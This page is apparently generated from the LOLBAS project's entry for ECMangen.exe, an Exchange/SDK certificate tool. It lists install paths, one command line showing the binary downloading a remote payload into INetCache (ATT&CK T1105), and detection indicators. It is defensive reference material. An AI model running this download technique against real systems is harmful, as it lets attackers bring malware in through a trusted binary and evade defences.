---
title: "ECMangen.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/ECMangen.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/ECMangen.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "ECMangen.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Command-line tool for managing certificates in Microsoft Exchange Server.

## Paths

- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe`
- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\Bin\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\ClientAccess\Bin\ECMangen.exe`
- `C:\ExchangeServer\Bin\ECMangen.exe`

## Commands

### 1. Download

Downloads payload from remote server

```cmd
ECMangen.exe {REMOTEURL}
```

- Use Case: It will download a remote payload and place it in INetCache
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- IOC: URL on a ECMangen command line
- IOC: ECMangen making unexpected network connections or DNS requests

## Acknowledgements

- {'Person': 'Avihay Eldad', 'Handle': '@AvihayEldad'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/ECMangen.yml)
